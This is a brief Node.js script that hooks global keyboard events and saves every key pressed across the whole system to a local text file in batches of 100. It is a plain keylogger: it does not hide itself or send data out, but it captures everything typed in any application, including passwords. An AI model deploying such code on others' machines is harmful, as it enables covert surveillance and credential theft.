import { GlobalKeyboardListener } from "node-global-key-listener";
import * as fs from "fs";
const globalKbListener = new GlobalKeyboardListener();

let keyPresses = [];
let keyPressCounter = 0;

globalKbListener.addListener(function (e, down) {
  if (e.state === "DOWN") {
    keyPressCounter++;
    console.log(e.name);
    keyPresses.push(e.name);
    if (keyPressCounter >= 100) {
      save();
      keyPressCounter = 0;
    }
  }
});

function save() {
  fs.writeFile("./output.txt", JSON.stringify(keyPresses), function (err) {
    if (err) {
      return console.log(err);
    }
    console.log("saved!");
  });
}
